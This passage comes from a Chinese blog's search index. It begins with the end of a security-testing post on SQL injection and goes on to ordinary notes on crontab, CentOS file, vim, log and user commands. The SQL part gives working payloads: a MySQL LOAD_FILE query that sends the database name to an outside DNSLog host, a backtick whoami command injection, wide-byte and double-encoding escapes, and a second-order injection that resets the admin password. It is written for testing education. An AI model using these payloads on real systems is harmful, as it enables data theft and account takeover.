上面使用反引号包起来的whoami被拿到服务器的终端去执行了，然后返回的结果放到了whoami的位置 白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了DNS的日志信息里面 mysql的load_file() 在mysql中，load_file函数可以发起请求，可以利用该函数发起请求，使用DnsLog接收请求，获取数据 语法：SELECT LOAD_FILE(CONCAT('\\\\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\\\abc')); 通过SQL语句查询内容，作为请求的一部分，发送至DnsLog 只要对这部分的语句进行构造，就能实现有回显的注入 但是对数据格式和内容有限制，只能写入指定的内容 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:4","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"宽字节注入 什么是宽字节 长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节 当程序对入参做过简单判断时，比如说将单引号转义成\\'，而当mysql在使用GBK编码时，会认为两个字符为一个汉字 输入 处理 编码 转义 SQL %df' %df\\' %df%5C%27 運' id=運' and 这样就可以成功注入了 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:5","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"二次编码注入 当经过多次编码后的参数仍不符合要求是，即可造成sql注入 例如：id=1%2527 1.上面的id参数值在PHP自身编码中会被识别为1%27 2.然后对1%27进行非法字符的转义，因为没有非法字符，所以直接跳过 3.此时如果程序中编写的代码对参数进行了转换的话，1%27就变成了1' 此时1’被传入到数据库中是可以将sql截断的 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:6","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"二次注入 原理 1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库 2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入 例子 假如该系统的数据库为mysql 1.先注册一个用户，用户名为admin 2.再注册一个用户，用户名为admin'# 3.然后修改admin'#用户的密码 当修改admin'#的时候就会产生SQL注入： update users set passwd = 'newPassword' where username = 'admin'#' and passwd = 'oldPassword' 可以看到上面的sql如果没有对admin'#做校验的话，那么就会成功注入，最终执行的sql为 update users set passwd = 'newPassword' where username = 'admin' 这样就成功的把admin用户的密码修改掉了 如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作 这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:7","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":["linux"],"content":"介绍 crontab在Linux系统中用于执行定时任务，比如服务巡检，日志备份清理，数据库备份 在Centos7中，最小安装会有该服务，进程名是crond ","date":"2021-04-18","objectID":"/posts/crontab/:1:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab文件详解 1./var/spool/cron/：该目录存放着每个用户设置的任务，文件以用户名命名 2./var/log/cron：该文件是crontab的日志文件，当任务执行没有成功时可以查看该日志排查 3./etc/crontab：该文件用来管理定时任务，默认有root用户可以编辑可以修改权限给其他用户编辑 SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed ","date":"2021-04-18","objectID":"/posts/crontab/:2:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"顶部环境相关部分 SHELL=/bin/bash：表示使用/bin/bash解释命令 PATH=/sbin:/bin:/usr/sbin:/usr/bin：表示到哪些目录寻找命令执行程序 MAILTO：当某个任务执行有输出时，输出内容将发送到那个用户的邮箱，为空则不发送 ","date":"2021-04-18","objectID":"/posts/crontab/:2:1","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"底部定时任务配置部分 下面是整个文件的核心部分 # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 时间部分 * * * * *表示的是时间配置 第一个*表示分钟，取值范围在0~59之间的整数 第二个*表示小时，取值范围在0~23之间的整数 第三个*表示日期，根据下面指定月份中的天数取值 第四个*表示月份，取值范围在1~12之间的整数 第五个*表示星期，取值范围在1~7之间的整数 特殊符号： *：代表规则范围内的任意值，如果设置该值的是分钟，则在满足其他条件下的情况下，每分钟都会执行 ,：将指定的值隔开，如在分钟中使用，1,18,23，在满足其他条件情况下，在1、18、23分钟都会执行 -：用于指定取值范围，如在分钟中使用，1-5，则表示的是1、2、3、4、5分钟 /：用于指定时间的执行频率，如在分钟中使用，0-30/2，则表示的是在30分钟之内，每隔两分钟执行一次 时间配置验证 https://crontab.guru/ 上面网址会对配置的时间验证 命令部分 user-name command to be executed表示的是用户和执行的命令 因为环境变量的原因，可能有很多在终端执行的命令，放到crontab里面执行不了，所以最好写绝对路径 环境变量的问题下面会详细写下，现在先写一个例子 # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed */2 * * * * /usr/sbin/ntpdate s1a.time.edu.cn 上面的例子是每两分钟同步一次s1a.time.edu.cn的时间 ","date":"2021-04-18","objectID":"/posts/crontab/:2:2","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab的环境变量 crontab默认不会加载用户和系统设置的环境变量，所以一些命令在终端可以执行但是在crontab执行不了 解决方法 1.在crontab添加任务时写绝对路径 2.把刷新环境变量的命令添加到crontab中，只适用于root用户 3.可以在对应的任务之前添加一段使系统环境变量生效的命令 4.可以把要执行的文件所在目录添加到PATH中 ","date":"2021-04-18","objectID":"/posts/crontab/:3:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab相关命令 crontab -l：列出当前用户的所有任务 crontab -e：编辑当前用户的任务，上面说普通用户没有办法把任务加到/etc/crontab中，但是可以使用这条命令添加属于自己的任务，格式与/etc/crontab相同 crontab /etc/crontab：用于root用户编辑完/etc/crontab后刷新任务列表 crontab -r：删除当前用户的所有任务，注意是删除所有，慎用 ","date":"2021-04-18","objectID":"/posts/crontab/:4:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"文件操作相关 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件拷贝 cp 拷贝文件：cp 要拷贝的文件 目标路径 拷贝文件redis.conf到/etc/目录下 [root@rui redis-6.2.0]# cp redis.conf /etc/ [root@rui redis-6.2.0]# ls /etc/redis.conf /etc/redis.conf 拷贝文件夹：cp -r 要拷贝的文件夹 目标路径 拷贝文件夹redis-6.2.0到/usr/local/目录下 [root@rui home]# cp -r redis-6.2.0/ /usr/local/ [root@rui home]# ls /usr/local/ bin games lib libexec redis-6.2.0 share etc include lib64 proc sbin src ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件移动 mv 移动文件夹/文件：mv 要移动的文件夹或者是文件 目标路径 移动文件redis.conf到src目录下 [root@rui redis-6.2.0]# mv redis.conf src/ [root@rui redis-6.2.0]# ls src/redis.conf src/redis.conf ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件查找 方式一：find 要查找的路径 -name 要查找的文件 find会遍历指定路径下的所有文件，然后返回符合条件的，支持模糊查询 [root@rui redis-6.2.0]# find ./ -name redis.c* ./src/redis.conf 方式二：locate 要查找的文件 locate 在/var/lib/mlocate/目录下存放着一个数据库文件，其实使用locate查询是查询的数据库，所以locate非常快 locate会返回所有包含文件名的文件 [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/red /home/redis-6.2.0/src/redis-benchmark /home/redis-6.2.0/src/redis-benchmark.c /home/redis-6.2.0/src/redis-benchmark.d /home/redis-6.2.0/src/redis-benchmark.o /home/redis-6.2.0/src/redis-check-aof /home/redis-6.2.0/src/redis-check-aof.c /home/redis-6.2.0/src/redis-check-aof.d /home/redis-6.2.0/src/redis-check-aof.o /home/redis-6.2.0/src/redis-check-rdb /home/redis-6.2.0/src/redis-check-rdb.c /home/redis-6.2.0/src/redis-check-rdb.d /home/redis-6.2.0/src/redis-check-rdb.o /home/redis-6.2.0/src/redis-cli /home/redis-6.2.0/src/redis-cli.c /home/redis-6.2.0/src/redis-cli.d /home/redis-6.2.0/src/redis-cli.o /home/redis-6.2.0/src/redis-sentinel /home/redis-6.2.0/src/redis-server /home/redis-6.2.0/src/redis-trib.rb /home/redis-6.2.0/src/redis.conf /home/redis-6.2.0/src/redisassert.h /home/redis-6.2.0/src/redismodule.h 然后新建一个文件，再查询一次 [root@rui redis-6.2.0]# \u003e /home/redis-6.2.0/src/testfile [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf [root@rui redis-6.2.0]# ll /home/redis-6.2.0/src/testfile -rw-r--r--. 1 root root 0 Apr 10 22:37 /home/redis-6.2.0/src/testfile 可以看到，没有查到，因为locate的数据库不是实时更新的，可以使用updatedb手动更新，也可以把更新命令配置到系统的任务计划表，定时执行 [root@rui redis-6.2.0]# updatedb [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf /home/redis-6.2.0/src/testfile 可以看到更新之后就查到了 2021-05-13： ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件权限相关 [root@rui nginx]# ll total 12 drwx------ 2 root root 6 Mar 8 11:49 client_body_temp drwxr-xr-x 2 root root 4096 May 10 11:39 conf drwx------ 2 root root 6 Mar 8 11:49 fastcgi_temp drwxr-xr-x 2 root root 38 Mar 8 10:50 html drwxr-xr-x 2 root root 55 Mar 29 10:01 logs -rw-r--r-- 1 root root 4796 May 11 20:14 nginx.conf drwx------ 3 root root 14 Apr 29 10:04 proxy_temp drwxr-xr-x 2 root root 18 Mar 8 10:50 sbin drwx------ 2 root root 6 Mar 8 11:49 scgi_temp drwx------ 2 root root 6 Mar 8 11:49 uwsgi_temp total 12 linux的数据存储是以块（block）为单位的，块可以理解成一个容器，每个块的大小可以用getconf PAGESIZE命令查看 每个块的容量是4096B，也就是4K drwx------ 2 root root 6 Mar 8 11:49 client_body_temp drwx------ d：表示文件夹，如果是-，则代表是文件 r：表示有可读权限，用数字表示为4 w：表示有可写权限，用数字表示为2 x：表示有可执行权限，用数字表示为1 rwx：文件权限 一个rwx可以理解为为一组权限，一个文件有三组，第一组为文件所属用户，第二组为所属用户组内的其他用户，第三组为其他用户 如果显示为\"-“符号则表示没有权限 设置权限可以使用chmod chmod 741 filename 741： 文件所属用户有该文件的可读、可写、可执行权限 文件所属用户组内的其它用户有该文件的可读权限 其他用户有该文件的可执行权限 drwx------ 2 root root 6 Mar 8 11:49 client_body_temp 2：硬连接个数 第一个root：文件所属用户 第二个root：文件所属用户的组 6：文件大小 Mar 8 11:49：最后修改时间 client_body_temp：文件名/目录名 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:4","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"vim相关 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"进入编辑模式 按i进入编辑模式后光标会在当前位置 按I进入编辑模式后光标会在当前行行首 按a进入编辑模式后，光标在当前字符后 按A进入编辑模式后，光标会在当前行行尾 按o进入编辑模式后，会在当前行下一行新开一行 按O进入编辑模式后，会在当前行上一行新开一行 我用的最多的是i ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"退出编辑模式 按ESC退出编辑模式 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查找 使用：/要查找的内容 使用vim /文件名打开文件后，输入/要查找的内容即可，比如下面我要在redis.conf配置文件中查找bind关键字 然后可以输入回车，会查找到该文件中第一个bind，可以输入n定位到下一个，输入N定位到上一个 取消高亮可以输入nohlsearch，简写为noh，也可以输入set nohlsearch ，简写为set noh ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"替换 把文件中的所有127.0.0.1替换为120.5.5.153 使用：:%s/127.0.0.1/120.5.5.153/g 把当前行的127.0.0.1替换为120.5.5.153 使用：:S/127.0.0.1/120.5.5.153/g 还有很多替换相关的命令，这里只是写了常用的 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:4","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"退出 退出不保存:q 强制退出不保存:q! 保存并退出:wq 强制保存并退出:wq! ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:5","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看日志 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"实时刷新查看日志 方式一：使用：tail -f -n 10 日志文件名称 -f：实时刷新 -n：行数关键字，后面跟行数，表示从后10行开始查看 方式二：使用：tailf 日志文件名称 默认从后十行开始查看 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看日志前10行 使用：head -n 行数 日志文件名称 -n ：行数关键字 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看第10行到第20行 方式一：使用：sed -n '10,20p' 日志文件名称 -n：打印指定行 '10,20p'：指定的行号 方式二：使用：cat -n 日志文件名称 | head -n 20 | tail -n +10 cat -n：打印日志显示行号 head -n 20：打印到20行 tail -n +10：从第10行开始打印 2021.04.20 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看进程 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"ps命令 ps （英文全拼：process status）命令用于显示当前进程的状态 –摘自菜鸟教程 参数 -a：列出所有进程 -w：显示加宽，可以显示更多内容 -u：以用户为主的进程状态 -x：显示当前用户在所有终端下的进程信息，通常和参数a一起使用 -e：显示系统内所有的进程信息 -l：使用长格式显示进程信息 -f：使用完整的格式显示进程信息 筛选 在输入了上面命令后添加|grep processName/processID ps -aux |grep mysql ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"根据进程查找文件 当因为某种原因找不到服务的存放位置时，可以使用上面的命令先查看进程的ID 然后使用命令：pwdx processID命令查找该进程文件存放的位置 [root@rabbitmq1 redis]# ps -aux |grep redis redis 4356 0.1 2.3 323184 133272 ? Ssl 4月19 25:12 /usr/bin/redis-server *:6379 root 7194 0.0 0.0 112736 996 pts/1 S+ 11:23 0:00 grep --color=auto redis [root@rabbitmq1 redis]# pwdx 4356 4356: /var/lib/redis ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看端口号是否被监听 [root@pacs local]# ss -tunlp |grep 3306 tcp LISTEN 0 128 *:3306 *:* users:((\"docker-proxy\",pid=28320,fd=4)) 2021.07.10 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:5:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看文件系统硬盘使用情况 使用df来查看硬盘使用情况 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:6:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"参数 a：显示所有文件信息 m：以MB为单位显示容量 k：以KB为单位显示容量 h：以KB、MB、GB为单位自行显示容量 T：显示该分区的文件系统名称 i：不用硬盘容量显示，而是以含有inode的数量来显示 使用的最多的是df -h [root@pacs ~]# df -h Filesystem Size Used Avail Use% Mounted on devtmpfs 7.8G 0 7.8G 0% /dev tmpfs 7.8G 0 7.8G 0% /dev/shm tmpfs 7.8G 777M 7.0G 10% /run tmpfs 7.8G 0 7.8G 0% /sys/fs/cgroup /dev/mapper/centos-root 50G 15G 36G 29% / /dev/mapper/centos-home 167G 83G 84G 50% /home /dev/xvda1 497M 219M 279M 45% /boot tmpfs 1.6G 12K 1.6G 1% /run/user/42 tmpfs 1.6G 0 1.6G 0% /run/user/385 tmpfs 1.6G 0 1.6G 0% /run/user/0 /dev/dm-5 30G 550M 30G 2% /home/apps/docker/devicemapper/mnt/716b06271724538bfaad350c0a054dde7e54db34e28c417f07842564d8a14021 /dev/dm-6 30G 526M 30G 2% /home/apps/docker/devicemapper/mnt/cd888eb5fe250ab255fc13646a5fd4de943b2b1bf162f64a7146697378ae9424 /dev/dm-7 30G 12G 19G 38% /home/apps/docker/devicemapper/mnt/4e95d08a9f25293974b18da280484a55cd1359e593d60c1a0db5697642c24c13 /dev/dm-8 30G 493M 30G 2% /home/apps/docker/devicemapper/mnt/652cb0933f40cea24bfd8df3ec43e63f02e65a51cd48bbd4fd4d8a617da2f7ac /dev/dm-9 30G 494M 30G 2% /home/apps/docker/devicemapper/mnt/3c74dba554f0e812152b80e1fc6d12865530ed573b57059d3cb01e0f3099c704 /dev/dm-10 30G 9.0G 22G 30% /home/apps/docker/devicemapper/mnt/8fc80177eea5c6f9565c102a9c1d234796e2ee9d9f444067522ed7d36765d0b4 20210728 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:6:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"用户组和用户操作 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:7:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"创建和删除 # 添加用户组 groupadd tester # 在tester用户组下创建一个用户 useradd -g tester testA # 给testA创建密码 passwd testA # 修改用户密码 # 修改root用户: passwd # 修改其它用户（需要使用root用户修改）: passwd testA # 查看用户属于那个组 groups testA id testA # 删除用户 userdel testA # 删除用户组 groupdel tester ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:7:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"权限 将/data/test/start.sh文件的拥有者赋予用户testA chown testA:tester /data/test/start.sh 将/data/test目录及其下面的所有文件的拥有者赋予用户test1（使用-R参数） chown -R testA:tester /data/test ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:7:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":null,"content":"第一篇文章 写点儿啥呢 这两天一直在弄博客，昨天弄了一天icon， hugo的文档有点儿多，没找到config.toml的说明文档 [手动笑哭] 最后各种Google，昨晚终于弄好了 其实昨天一直边玩儿边搞，在家弄效率是不太高 ^_^ 但是这个为啥不兼容markdown的表情 ToT 今天是清明节，本来打算回家…，改到五一假期再回吧 祝自个儿下周二顺利吧 开始学习… ","date":"2021-04-04","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","tags":null,"title":"第一篇文章","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"}]